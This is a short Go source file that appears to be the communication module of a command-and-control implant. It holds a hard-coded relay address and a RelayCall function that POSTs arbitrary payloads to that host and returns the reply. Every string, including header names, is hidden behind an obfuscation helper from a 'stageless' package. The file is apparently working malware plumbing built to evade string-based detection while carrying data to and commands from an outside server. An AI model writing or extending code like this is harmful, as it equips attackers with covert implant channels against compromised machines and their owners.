package custom

import (
	"io"
	"net/http"
	"strings"
	"stageless/utils/obf"
)

var relayServerHost = obf.S("http://192.168.15.10:9090/")

func RelayCall(payload string) (uint16, string) {
	// Sends the payload to the relay and returns the status and body
	req, err := http.NewRequest(http.MethodPost, relayServerHost, strings.NewReader(payload))
	if err != nil {
		return 0, obf.S("")
	}
	req.Header.Set(obf.S("Connection"), obf.S("close"))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return 0, obf.S("")
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return uint16(resp.StatusCode), obf.S("")
	}
	return uint16(resp.StatusCode), string(raw)
}
